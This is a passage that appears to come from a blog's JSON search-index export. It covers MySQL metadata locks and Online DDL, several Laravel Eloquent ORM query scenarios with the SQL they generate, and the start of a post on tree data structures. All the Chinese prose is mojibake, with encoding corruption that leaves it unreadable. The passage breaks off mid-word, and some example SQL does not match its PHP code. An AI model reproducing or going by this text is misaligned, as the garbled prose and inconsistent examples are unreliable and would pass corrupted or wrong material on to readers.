ä¹‹å‰ï¼Œä¹Ÿåªèƒ½æ‰§ è¡Œè¯» t1ã€è¯»å†™ t2 çš„æ“ä½œã€‚è¿å†™ t1 éƒ½ä¸å…è®¸ï¼Œè‡ªç„¶ä¹Ÿä¸èƒ½è®¿é—®å…¶ä»–è¡¨ã€‚ åœ¨è¿˜æ²¡æœ‰å‡ºç°æ›´ç»†ç²’åº¦çš„é”çš„æ—¶å€™ï¼Œè¡¨é”æ˜¯æœ€å¸¸ç”¨çš„å¤„ç†å¹¶å‘çš„æ–¹å¼ã€‚è€Œå¯¹äº InnoDB è¿™ ç§æ”¯æŒè¡Œé”çš„å¼•æ“ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ lock tables å‘½ä»¤æ¥æ§åˆ¶å¹¶å‘ï¼Œæ¯•ç«Ÿé”ä½æ•´ä¸ªè¡¨çš„å½±å“é¢è¿˜ æ˜¯å¤ªå¤§ã€‚ å¦ä¸€ç±»è¡¨çº§çš„é”æ˜¯ MDL(metadata lock)ã€‚MDL ä¸éœ€è¦æ˜¾å¼ä½¿ç”¨ï¼Œåœ¨è®¿é—®ä¸€ä¸ªè¡¨çš„æ—¶å€™ ä¼šè¢«è‡ªåŠ¨åŠ ä¸Šã€‚MDL çš„ä½œç”¨æ˜¯ï¼Œä¿è¯è¯»å†™çš„æ­£ç¡®æ€§ã€‚ä½ å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœä¸€ä¸ªæŸ¥è¯¢æ­£åœ¨ éå†ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œè€Œæ‰§è¡ŒæœŸé—´å¦ä¸€ä¸ªçº¿ç¨‹å¯¹è¿™ä¸ªè¡¨ç»“æ„åšå˜æ›´ï¼Œåˆ äº†ä¸€åˆ—ï¼Œé‚£ä¹ˆæŸ¥è¯¢çº¿ ç¨‹æ‹¿åˆ°çš„ç»“æœè·Ÿè¡¨ç»“æ„å¯¹ä¸ä¸Šï¼Œè‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚ MDL æ˜¯MySQL 5.5ç‰ˆæœ¬å¼•å…¥çš„ï¼Œå½“å¯¹ä¸€ä¸ªè¡¨åšå¢åˆ æ”¹æŸ¥æ“ä½œçš„æ—¶å€™ï¼ŒåŠ  MDL è¯»é”;å½“è¦å¯¹è¡¨åšç»“æ„å˜æ›´æ“ä½œçš„æ—¶å€™ï¼ŒåŠ  MDL å†™é”ã€‚ è¯»é”ä¹‹é—´ä¸äº’æ–¥ï¼Œå› æ­¤ä½ å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹åŒæ—¶å¯¹ä¸€å¼ è¡¨å¢åˆ æ”¹æŸ¥ã€‚ è¯»å†™é”ã€å†™é”ä¹‹é—´æ˜¯äº’æ–¥çš„ï¼Œç”¨æ¥ä¿è¯å˜æ›´è¡¨ç»“æ„æ“ä½œçš„å®‰å…¨æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªçº¿ç¨‹è¦åŒæ—¶ç»™ä¸€ä¸ªè¡¨åŠ å­—æ®µæˆ–è€…åˆ†åˆ«è¿›è¡Œå¢åˆ æ”¹æŸ¥å’ŒåŠ å­—æ®µï¼Œé‚£ä¹ˆå…¶ä¸­ä¸€ä¸ªè¦ç­‰å¦ä¸€ä¸ªæ‰§è¡Œå®Œæ‰èƒ½å¼€å§‹æ‰§è¡Œã€‚ Mysql 5.6 ä¹‹åï¼Œæ”¯æŒOnline DDLï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šå µå¡å¢åˆ æ”¹æŸ¥ã€‚ Online DDLçš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„: æ‹¿MDLå†™é” é™çº§æˆMDLè¯»é” çœŸæ­£åšDDL å‡çº§æˆMDLå†™é” é‡Šæ”¾MDLé” ä¸‹é¢é€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜ï¼Œä¸ºä»€ä¹ˆæœ‰æ—¶å€™ç»™å°è¡¨å¢åŠ å­—æ®µä¹Ÿå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªè¡¨è¢«é”ä½ã€‚ è¿™é‡Œçš„å®éªŒç¯å¢ƒæ˜¯ MySQL 5.7ã€‚ ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ° session A å…ˆå¯åŠ¨ï¼Œè¿™æ—¶å€™ä¼šå¯¹è¡¨ t åŠ ä¸€ä¸ª MDL è¯»é”ã€‚ç”±äº session B éœ€è¦ çš„ä¹Ÿæ˜¯ MDL è¯»é”ï¼Œå› æ­¤å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶ session A å¼€å¯äº†äº‹åŠ¡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é‡Šæ”¾ã€‚ ä¹‹å session C ä¼šè¢« blockedï¼Œæ˜¯å› ä¸º session A çš„ MDL è¯»é”è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œè€Œ session C éœ€è¦ MDL å†™é”ï¼Œå› æ­¤åªèƒ½è¢«é˜»å¡ï¼ˆé˜»å¡åŸå› å°±æ˜¯å‰é¢æåˆ°çš„ï¼ŒMDL è¯»å†™é”æ˜¯äº’æ–¥çš„ï¼‰ã€‚ å¦‚æœåªæœ‰ session C è‡ªå·±è¢«é˜»å¡è¿˜æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä½†æ˜¯ä¹‹åæ‰€æœ‰è¦åœ¨è¡¨ t ä¸Šæ–°ç”³è¯· MDL è¯»é”çš„è¯·æ±‚ä¹Ÿä¼šè¢« session C é˜»å¡ã€‚å‰é¢æˆ‘ä»¬è¯´äº†ï¼Œæ‰€æœ‰å¯¹è¡¨çš„å¢åˆ æ”¹æŸ¥æ“ä½œéƒ½éœ€è¦å…ˆç”³è¯· MDL è¯»é”ï¼Œå°±éƒ½è¢«é”ä½ï¼Œç­‰äºè¿™ä¸ªè¡¨ç°åœ¨å®Œå…¨ä¸å¯è¯»å†™äº†ã€‚ å¦‚æœæŸä¸ªè¡¨ä¸Šçš„æŸ¥è¯¢è¯­å¥é¢‘ç¹ï¼Œè€Œä¸”å®¢æˆ·ç«¯æœ‰é‡è¯•æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¶…æ—¶åä¼šå†èµ·ä¸€ä¸ªæ–° session å†è¯·æ±‚çš„è¯ï¼Œè¿™ä¸ªåº“çš„çº¿ç¨‹å¾ˆå¿«å°±ä¼šçˆ†æ»¡ã€‚ äº‹åŠ¡ä¸­çš„ MDL é”ï¼Œåœ¨è¯­å¥æ‰§è¡Œå¼€å§‹æ—¶ç”³è¯·ï¼Œä½†æ˜¯è¯­å¥ç»“æŸåå¹¶ä¸ä¼šé©¬ä¸Šé‡Šæ”¾ï¼ŒMDL éœ€è¦ç­‰åˆ°æ•´ä¸ªäº‹åŠ¡æäº¤åå†é‡Šæ”¾ã€‚ é‚£ä¹ˆå¦‚ä½•å®‰å…¨çš„ç»™å°è¡¨åŠ å­—æ®µå‘¢ï¼Ÿ éçƒ­ç‚¹è¡¨ï¼šè§£å†³é•¿äº‹åŠ¡ã€æ…¢æŸ¥è¯¢å ç€ MDL é”ä¸é‡Šæ”¾çš„é—®é¢˜ çƒ­ç‚¹è¡¨ï¼šåœ¨ alter table è¯­å¥é‡Œé¢è®¾å®šç­‰å¾…æ—¶é—´ æ‰€ä»¥åœ¨åš DDL æ“ä½œä¹‹å‰ï¼Œæœ€å¥½çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰å¤§äº‹åŠ¡çš„æäº¤ï¼Œæˆ–è€…æ…¢æŸ¥è¯¢å­˜åœ¨ï¼Œå°½é‡é¿å…ä¸è¿™äº›åŒæ—¶æ‰§è¡Œã€‚ æ€»ç»“ å¤‡ä»½æ•´åº“æ—¶ï¼Œéœ€è¦åŠ å…¨å±€é”ã€‚æœ‰ä¸¤ç§æ–¹å¼ï¼šFTWRL å’Œ mysqldump çš„ -single-transactionã€‚ä¸€ä¸ªåº“è¢«å…¨å±€é”ä¸Šä»¥åï¼Œè¦å¯¹é‡Œé¢ä»»ä½•ä¸€ä¸ªè¡¨åšåŠ å­—æ®µæ“ä½œï¼Œéƒ½æ˜¯ä¼šè¢«é”ä½çš„ã€‚ è¡¨çº§é”æœ‰ä¸¤ç§ï¼šè¡¨é”å’Œ MDLã€‚å‰è€…éœ€è¦æ˜¾å¼ä½¿ç”¨ï¼Œåè€…åˆ™ä¸éœ€è¦ï¼Œæ˜¯ç³»ç»Ÿé»˜è®¤åŠ çš„ã€‚ update table set is_enable = 1 è¿™ä¸ª SQL è¯­å¥ï¼Œè·å–çš„è¿˜æ˜¯è¡Œé”ï¼Œåªæ˜¯æ˜¯è¿™ä¸ªè¡¨çš„æ‰€æœ‰è¡Œã€‚ Mysql 5.6 ä»¥åæ”¯æŒ Online DDLï¼Œä¹Ÿå°±æ˜¯å¯¹è¡¨åš DDL æ“ä½œï¼Œä¸ä¼šé˜»å¡å¢åˆ æ”¹æŸ¥ã€‚ ä¸è¿‡åš DDL æ“ä½œä¹‹å‰ï¼Œè¿˜æ˜¯è¦çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰é•¿äº‹åŠ¡æœªæäº¤ï¼Œå¦åˆ™ DDL æ“ä½œä¼šè¢«é˜»å¡ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Eloquent ORM å¸¸è§ä½¿ç”¨åœºæ™¯æ•´ç†","slug":"common-usage-scenarios-of-eloquent-orm","date":"2022-06-09T14:57:36.000Z","updated":"2022-06-27T08:17:37.103Z","comments":true,"path":"common-usage-scenarios-of-eloquent-orm/","link":"","permalink":"https://www.0x2beace.com/common-usage-scenarios-of-eloquent-orm/","excerpt":"ä»¥ä¸‹å®ä¾‹ï¼Œéƒ½æ˜¯åŸºäº Eloquent ORMï¼Œå¯ä»¥ç›´æ¥åœ¨ Laravel ä¸‹ç›´æ¥ä½¿ç”¨ã€‚","text":"ä»¥ä¸‹å®ä¾‹ï¼Œéƒ½æ˜¯åŸºäº Eloquent ORMï¼Œå¯ä»¥ç›´æ¥åœ¨ Laravel ä¸‹ç›´æ¥ä½¿ç”¨ã€‚ åœºæ™¯ä¸€ç”¨æˆ·è¡¨å¢åŠ äº†ä¸€ä¸ªå­—æ®µï¼Œå› ä¸ºé¡¹ç›®ä¸­æœ‰è®¸å¤šæŒ‡å®šéƒ¨åˆ†åˆ—çš„æŸ¥è¯¢ï¼Œç°åœ¨å¸Œæœ›é¡¹ç›®ä¸­æ‰€æœ‰æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯çš„åœ°æ–¹éƒ½å¯ä»¥è‡ªåŠ¨åŠ ä¸Šè¿™ä¸ªå­—æ®µã€‚ è§£å†³æ–¹æ¡ˆï¼šé‡å†™ç”¨æˆ·æ¨¡å‹ booted æ–¹æ³•ï¼Œå¹¶é—­åŒ…è‡ªå®šä¹‰å…¨å±€æŸ¥è¯¢ä½œç”¨åŸŸã€‚ 123456789protected static function booted()&#123; static::addGlobalScope(\"uid\", function (Builder $builder) &#123; $columns = $builder-&gt;getQuery()-&gt;columns; if (!is_null($columns)) &#123; $builder-&gt;addSelect([\"is_vip\",]); &#125; &#125;);&#125; è¿™æ ·ï¼Œå½“æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢æ—¶ï¼Œç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 123$user = UserModel::select([\"uid\", \"nickname\"])-&gt;find(1);// select `uid`, `nickname`, `is_vip` from `user` where `user`.`uid` = '1' limit 1 åœºæ™¯äºŒä¸€å¯¹å¤šå…³è”ï¼ˆç”¨æˆ·è¡¨ä¸æ–‡ç« è¡¨ï¼‰ï¼šå¦‚ä½•è·æœ€æ–°ä¸€æ¡è®°å½•æˆ–ç»Ÿè®¡å…³è”æ•°æ®çš„åˆè®¡ã€‚ ä»¥ç”¨æˆ·ä¸æ–‡ç« ä¹‹é—´çš„ä¸€å¯¹å¤šå…³è”ä¸ºä¾‹ï¼Œå¦‚æœç”¨æˆ·åˆ—è¡¨éœ€è¦è¿”å›ç”¨æˆ·å‘å¸ƒæœ€æ–°æ–‡ç« çš„æ ‡é¢˜ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•è¿›è¡ŒæŸ¥è¯¢ï¼Ÿ è¿™ä¸ªåœºæ™¯ä¸‹ä½¿ç”¨è¿æ¥æŸ¥è¯¢æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæ¶‰åŠåˆ°è¢«é©±åŠ¨è¡¨çš„æ’åºå’Œé™å®šæŸ¥è¯¢é—®é¢˜ã€‚ æ€è·¯ï¼šåŸºäºå­æŸ¥è¯¢ç»“åˆå…³è”æ¨¡å‹è¿›è¡ŒæŸ¥è¯¢ã€‚ 1234567891011public function index()&#123; $users = User::addSelect([ 'last_post_title' =&gt; Post::select(['title']) -&gt;whereColumn('uid', 'users.uid') -&gt;orderByDesc('created_at') -&gt;limit(1) ]) -&gt;orderByDesc('uid') -&gt;get();&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select (select title from `posts` where `uid` = `user`.`uid` order by `created_at` desc limit 1 ) as `last_post_title`,`user`.* from `user` order by `uid` desc ; å¯¹æŸä¸ªå­—æ®µè¿›è¡Œåˆè®¡ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼š 1234567891011public function index()&#123;UserModel::addSelect([ \"amount\" =&gt; OrderModel::selectRaw('sum(total_price)') -&gt;whereColumn('uid', 'user.uid') -&gt;orderByDesc(\"total_price\") -&gt;limit(1) ]) -&gt;orderByDesc(\"amount\") -&gt;get();&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select (select SUM(total_price) from `order` where `uid` = `user`.`uid` order by `total_price` desc limit 1 ) as `amount`,`user`.* from `user` order by `amount` desc ; åœºæ™¯ä¸‰èšåˆç»Ÿè®¡ï¼šç»Ÿè®¡è®¢å•è¡¨ä¸­ä¸åŒçŠ¶æ€ä¸‹çš„è®¢å•æ•°é‡ã€‚ æ€è·¯ä¸€ï¼šå¯¹è®¢å•çŠ¶æ€è¿›è¡Œåˆ†ç»„ï¼Œç„¶åé€šè¿‡ä»£ç é€»è¾‘ç»Ÿè®¡ä¸åŒçŠ¶æ€ä¸‹è®¢å•æ•°é‡ã€‚ 123456public function index()&#123; OrderModel::selectRaw(\"count(order_id), user_order_status\") -&gt;groupBy(\"user_order_status\") -&gt;get();&#125; ç”Ÿæˆ SQLï¼š 1select count(order_id), user_order_status from `order` group by `user_order_status æ€è·¯ä¸€ï¼šå°†å¤šæ¬¡èšåˆç»Ÿè®¡æŸ¥è¯¢åˆå¹¶ä¸ºä¸€æ¬¡æŸ¥è¯¢ï¼š 1234567public function index()&#123; OrderModel::selectRaw('COUNT(CASE WHEN `user_order_status` = 0 then 1 END) AS draft_count') -&gt;selectRaw('COUNT(CASE WHEN `user_order_status` = 1 then 1 END) AS audit_count') -&gt;selectRaw('COUNT(CASE WHEN `user_order_status` = 2 then 1 END) AS normal_count') -&gt;first();&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select COUNT(CASE WHEN `user_order_status` = 0 then 1 END) AS draft_count, COUNT(CASE WHEN `user_order_status` = 1 then 1 END) AS audit_count, COUNT(CASE WHEN `user_order_status` = 2 then 1 END) AS normal_count from `order` limit 1 åœºæ™¯å››ä¸€å¯¹ä¸€å…³è”æ’åºï¼ˆç”¨æˆ·ä¸»è¡¨ä¸ç”¨æˆ·è¾…è¡¨ï¼‰ï¼šç”¨æˆ·åˆ—è¡¨å¯æ ¹æ®ç”¨æˆ·è¾…è¡¨çš„æŸä¸ªå­—æ®µè¿›è¡Œæ’åºã€‚ æ€è·¯ä¸€ï¼šå­æŸ¥è¯¢ 12345678910public function index()&#123;UserModel::select(['uid', 'nickname']) -&gt;orderBy(UserInfoModel::select('broken_number') -&gt;whereColumn('uid', 'user.uid') -&gt;orderBy('broken_number') -&gt;limit(1) ) -&gt;paginate(20);&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select `uid`, `nickname` from `user` order by (select `broken_number` from `user_info` where `uid` = `user`.`uid` order by `broken_number` desc limit 1) desc limit 20 offset 0; æ€è·¯äºŒï¼šå…³è”æŸ¥è¯¢ 1234567public function index()&#123; UserModel::select(\"user.*\") -&gt;join('user_info', 'user_info.uid', '=', 'user.uid') -&gt;orderBy('user_info.broken_number') -&gt;paginate(20);&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select `user`.* from `user` inner join `user_info` on `user_info`.`uid` = `user`.`uid` order by `user_info`.`broken_number` asc limit 20 offset 0 åœºæ™¯äº”ä¸€å¯¹å¤šå…³è”æ’åºï¼ˆç”¨æˆ·è¡¨ä¸è®¢å•è¡¨ï¼‰ï¼šç”¨æˆ·åˆ—è¡¨å±•ç¤ºç”¨æˆ·å¯¹åº”åˆ›å»ºè®¢å•çš„é‡‘é¢ï¼Œå¹¶æ ¹æ®é‡‘é¢å¤§å°è¿›è¡Œæ’åºã€‚ ä¸€å¯¹å¤šå…³è”çš„åœºæ™¯ä¸èƒ½ä½¿ç”¨è¿æ¥æŸ¥è¯¢ï¼Œå› ä¸ºå¦‚æœè¢«é©±åŠ¨è¡¨ä¸­æ²¡æœ‰å…³è”çš„æ•°æ®ï¼Œé©±åŠ¨è¡¨çš„è®°å½•ä¹Ÿä¸ä¼šå‡ºç°åœ¨ç»“æœåˆ—è¡¨ä¸­ï¼ŒåŒæ—¶æ¶‰åŠåˆ°æ’åºå’Œé™å®šæŸ¥è¯¢é—®é¢˜ã€‚ æ€è·¯ï¼šå­æŸ¥è¯¢ 1234567891011public function index()&#123; UserModel::addSelect([ \"cost_amount\" =&gt; OrderModel::selectRaw('sum(total_price)') -&gt;whereColumn('uid', 'user.uid') -&gt;orderByDesc(\"total_price\") -&gt;limit(1) ]) -&gt;orderByDesc(\"cost_amount\") -&gt;paginate(20);&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select `user`.*, (select sum(total_price) from `order` where `uid` = `user`.`uid` and `order`.`is_deleted` = '0' order by `total_price` desc limit 1) as `cost_amount` from `user` order by `cost_amount` desc limit 20 offset åœºæ™¯å…­åŸºäºå­æŸ¥è¯¢ç»“åˆå…³è”æ¨¡å‹è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ã€‚ æ€è·¯ï¼šé€šè¿‡ä¸€ä¸ª EXISTS å­æŸ¥è¯¢å®ç°åŸºäºå…³è”æ¨¡å‹å­—æ®µå¯¹ User æ¨¡å‹å®ä¾‹çš„ç­›é€‰ã€‚ 12345678public function index()&#123; $result = OrderModel::whereHas(\"user\", function ($query) &#123; $query-&gt;where('mobile', '*******'); &#125;) -&gt;orderByDesc(\"order_id\") -&gt;paginate(20);&#125; ç”Ÿæˆ SQL å¦‚ä¸‹ï¼š 1select * from `order` where exists (select * from `user` where `order`.`uid` = `user`.`uid` and `mobile` = '*******') order by `order_id` desc limit 20 offset 0","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"æ•°æ®ç»“æ„ï¼ˆäº”ï¼‰äºŒå‰æœç´¢æ ‘","slug":"data-structure-5-binary-search-tree","date":"2022-06-08T13:56:40.000Z","updated":"2022-06-17T07:35:22.677Z","comments":true,"path":"data-structure-5-binary-search-tree/","link":"","permalink":"https://www.0x2beace.com/data-structure-5-binary-search-tree/","excerpt":"æ ‘çš„æ¦‚å¿µä¹‹å‰ä»‹ç»çš„æ‰€æœ‰çš„æ•°æ®ç»“æ„éƒ½æ˜¯çº¿æ€§å­˜å‚¨ç»“æ„ã€‚æœ¬ç« æ‰€ä»‹ç»çš„æ ‘ç»“æ„æ˜¯ä¸€ç§éçº¿æ€§å­˜å‚¨ç»“æ„ï¼Œå­˜å‚¨çš„æ˜¯å…·æœ‰â€œä¸€å¯¹å¤šâ€å…³ç³»çš„æ•°æ®å…ƒç´ çš„é›†åˆã€‚","text":"æ ‘çš„æ¦‚å¿µä¹‹å‰ä»‹ç»çš„æ‰€æœ‰çš„æ•°æ®ç»“æ„éƒ½æ˜¯çº¿æ€§å­˜å‚¨ç»“æ„ã€‚æœ¬ç« æ‰€ä»‹ç»çš„æ ‘ç»“æ„æ˜¯ä¸€ç§éçº¿æ€§å­˜å‚¨ç»“æ„ï¼Œå­˜å‚¨çš„æ˜¯å…·æœ‰â€œä¸€å¯¹å¤šâ€å…³ç³»çš„æ•°æ®å…ƒç´ çš„é›†åˆã€‚ å›¾ 1(A) æ˜¯ä½¿ç”¨æ ‘ç»“æ„å­˜å‚¨çš„é›†åˆ {A,B,C,D,E,F,G,H,I,J,K,L,M} çš„ç¤ºæ„å›¾ã€‚å¯¹äºæ•°æ® A æ¥è¯´ï¼Œå’Œæ•°æ® Bã€Cã€D æœ‰å…³ç³»ï¼›å¯¹äºæ•°æ® B æ¥è¯´ï¼Œå’Œ Eã€F æœ‰å…³ç³»ã€‚è¿™å°±æ˜¯â€œä¸€å¯¹å¤šâ€çš„å…³ç³»ã€‚ å°†å…·æœ‰â€œä¸€å¯¹å¤šâ€å…³ç³»çš„é›†åˆä¸­çš„æ•°æ®å…ƒç´ æŒ‰ç…§å›¾ 1ï¼ˆAï¼‰çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œæ•´ä¸ªå­˜å‚¨å½¢çŠ¶åœ¨é€»è¾‘ç»“æ„ä¸Šçœ‹ï¼Œç±»ä¼¼äºå®é™…ç”Ÿæ´»ä¸­å€’ç€çš„æ ‘ï¼ˆå›¾ 1ï¼ˆBï¼‰å€’è¿‡æ¥ï¼‰ï¼Œæ‰€ä»¥ç§°è¿™ç§å­˜å‚¨ç»“æ„ä¸ºâ€œæ ‘å‹â€å­˜å‚¨ç»“æ„ã€‚ æ ‘çš„ç»“ç‚¹ç»“ç‚¹ï¼šä½¿ç”¨æ ‘ç»“æ„å­˜å‚¨çš„æ¯ä¸€ä¸ªæ•°æ®å…ƒç´ éƒ½è¢«ç§°ä¸ºâ€œç»“ç‚¹â€ã€‚ä¾‹å¦‚ï¼Œå›¾ 1ï¼ˆAï¼‰ä¸­ï¼Œæ•°æ®å…ƒç´  A å°±æ˜¯ä¸€ä¸ªç»“ç‚¹ï¼› çˆ¶ç»“ç‚¹ï¼ˆåŒäº²ç»“ç‚¹ï¼‰ã€å­ç»“ç‚¹å’Œå…„å¼Ÿç»“ç‚¹ï¼šå¯¹äºå›¾ 1ï¼ˆAï¼‰ä¸­çš„ç»“ç‚¹ Aã€Bã€Cã€D æ¥è¯´ï¼ŒA æ˜¯ Bã€Cã€D ç»“ç‚¹çš„çˆ¶ç»“ç‚¹ï¼ˆä¹Ÿç§°ä¸ºâ€œåŒäº²ç»“ç‚¹â€ï¼‰ï¼Œè€Œ Bã€Cã€D éƒ½æ˜¯ A ç»“ç‚¹çš„å­ç»“ç‚¹ï¼ˆä¹Ÿç§°â€œå­©å­ç»“ç‚¹â€ï¼‰ã€‚å¯¹äº Bã€Cã€D æ¥è¯´ï¼Œå®ƒä»¬éƒ½æœ‰ç›¸åŒçš„çˆ¶ç»“ç‚¹ï¼Œæ‰€ä»¥å®ƒä»¬äº’ä¸ºå…„å¼Ÿç»“ç‚¹ã€‚ æ ‘æ ¹ç»“ç‚¹ï¼ˆç®€ç§°â€œæ ¹ç»“ç‚¹â€ï¼‰ï¼šæ¯ä¸€ä¸ªéç©ºæ ‘éƒ½æœ‰ä¸”åªæœ‰ä¸€ä¸ªè¢«ç§°ä¸ºæ ¹çš„ç»“ç‚¹ã€‚å›¾ 1ï¼ˆAï¼‰ä¸­ï¼Œç»“ç‚¹ A å°±æ˜¯æ•´æ£µæ ‘çš„æ ¹ç»“ç‚¹ã€‚ å¶å­ç»“ç‚¹ï¼šå¦‚æœç»“ç‚¹æ²¡æœ‰ä»»ä½•å­ç»“ç‚¹ï¼Œé‚£ä¹ˆæ­¤ç»“ç‚¹ç§°ä¸ºå¶å­ç»“ç‚¹ï¼ˆå¶ç»“ç‚¹ï¼‰ã€‚ä¾‹å¦‚å›¾ 1ï¼ˆAï¼‰ä¸­ï¼Œç»“ç‚¹ Kã€Lã€Fã€Gã€Mã€Iã€J éƒ½æ˜¯è¿™æ£µæ ‘çš„å¶å­ç»“ç‚¹ã€‚ æ ‘æ ¹çš„åˆ¤æ–­ä¾æ®ä¸ºï¼šå¦‚æœä¸€ä¸ªç»“ç‚¹æ²¡æœ‰çˆ¶ç»“ç‚¹ï¼Œé‚£ä¹ˆè¿™ä¸ªç»“ç‚¹å°±æ˜¯æ•´æ£µæ ‘çš„æ ¹ç»“ç‚¹ã€‚ å­æ ‘å’Œç©ºæ ‘ å­æ ‘ï¼šå¦‚å›¾ 1ï¼ˆAï¼‰ä¸­ï¼Œæ•´æ£µæ ‘çš„æ ¹ç»“ç‚¹ä¸ºç»“ç‚¹ Aï¼Œè€Œå¦‚æœå•çœ‹ç»“ç‚¹ Bã€Eã€Fã€Kã€L ç»„æˆçš„éƒ¨åˆ†æ¥è¯´ï¼Œä¹Ÿæ˜¯æ£µæ ‘ï¼Œè€Œä¸”èŠ‚ç‚¹ B ä¸ºè¿™æ£µæ ‘çš„æ ¹ç»“ç‚¹ã€‚æ‰€ä»¥ç§° Bã€Eã€Fã€Kã€L è¿™å‡ ä¸ªç»“ç‚¹ç»„æˆçš„æ ‘ä¸ºæ•´æ£µæ ‘çš„å­æ ‘ï¼›åŒæ ·ï¼Œç»“ç‚¹ Eã€Kã€L æ„æˆçš„ä¹Ÿæ˜¯ä¸€æ£µå­æ ‘ï¼Œæ ¹ç»“ç‚¹ä¸º Eã€‚ æ³¨æ„ï¼šå•ä¸ªç»“ç‚¹ä¹Ÿæ˜¯ä¸€æ£µæ ‘ï¼Œåªä¸è¿‡æ ¹ç»“ç‚¹å°±æ˜¯å®ƒæœ¬èº«ã€‚å›¾ 1ï¼ˆAï¼‰ä¸­ï¼Œç»“ç‚¹ Kã€Lã€F ç­‰éƒ½æ˜¯æ ‘ï¼Œä¸”éƒ½æ˜¯æ•´æ£µæ ‘çš„å­æ ‘ã€‚ çŸ¥é“äº†å­æ ‘çš„æ¦‚å¿µåï¼Œæ ‘ä¹Ÿå¯ä»¥è¿™æ ·å®šä¹‰ï¼šæ ‘æ˜¯ç”±æ ¹ç»“ç‚¹å’Œè‹¥å¹²æ£µå­æ ‘æ„æˆçš„ã€‚ ç©ºæ ‘ï¼šå¦‚æœé›†åˆæœ¬èº«ä¸ºç©ºï¼Œé‚£ä¹ˆæ„æˆçš„æ ‘å°±è¢«ç§°ä¸ºç©ºæ ‘ã€‚ç©ºæ ‘ä¸­æ²¡æœ‰ç»“ç‚¹ã€‚ è¡¥å……ï¼šåœ¨æ ‘ç»“æ„ä¸­ï¼Œå¯¹äºå…·æœ‰åŒä¸€ä¸ªæ ¹ç»“ç‚¹çš„å„ä¸ªå­æ ‘ï¼Œç›¸äº’ä¹‹é—´ä¸èƒ½æœ‰äº¤é›†ã€‚ä¾‹å¦‚ï¼Œå›¾ 1ï¼ˆAï¼‰ä¸­ï¼Œé™¤äº†æ ¹ç»“ç‚¹ Aï¼Œå…¶ä½™å…ƒç´ åˆå„è‡ªæ„æˆäº†ä¸‰ä¸ªå­æ ‘ï¼Œæ ¹ç»“ç‚¹åˆ†åˆ«ä¸º Bã€Cã€Dï¼Œè¿™ä¸‰ä¸ªå­æ ‘ç›¸äº’ä¹‹é—´æ²¡æœ‰ç›¸åŒçš„ç»“ç‚¹ã€‚å¦‚æœæœ‰ï¼Œå°±ç ´åäº†æ ‘çš„ç»“æ„ï¼Œä¸èƒ½ç®—åšæ˜¯ä¸€æ£µæ ‘ã€‚ æœ‰åºæ ‘å’Œæ— åºæ ‘å¦‚æœæ ‘ä¸­ç»“ç‚¹çš„å­æ ‘ä»å·¦åˆ°å³çœ‹ï¼Œè°åœ¨å·¦è¾¹ï¼Œè°åœ¨å³è¾¹ï¼Œæ˜¯æœ‰è§„å®šçš„ï¼Œè¿™æ£µæ ‘ç§°ä¸ºæœ‰åºæ ‘ï¼›åä¹‹ç§°ä¸ºæ— åºæ ‘ã€‚ åœ¨æœ‰åºæ ‘ä¸­ï¼Œä¸€ä¸ªç»“ç‚¹æœ€å·¦è¾¹çš„å­æ ‘ç§°ä¸ºâ€ç¬¬ä¸€ä¸ªå­©å­â€ï¼Œæœ€å³è¾¹çš„ç§°ä¸ºâ€æœ€åä¸€ä¸ªå­©å­â€ã€‚ æ‹¿å›¾ 1ï¼ˆAï¼‰æ¥è¯´ï¼Œå¦‚æœæ˜¯å…¶æœ¬èº«æ˜¯ä¸€æ£µæœ‰åºæ ‘ï¼Œåˆ™ä»¥ç»“ç‚¹ B ä¸ºæ ¹ç»“ç‚¹çš„å­æ ‘ä¸ºæ•´æ£µæ ‘çš„ç¬¬ä¸€ä¸ªå­©å­ï¼Œä»¥ç»“ç‚¹D ä¸ºæ ¹ç»“ç‚¹çš„å­æ ‘ä¸ºæ•´æ£µæ ‘çš„æœ€åä¸€ä¸ªå­©å­ã€‚ äºŒå‰æ 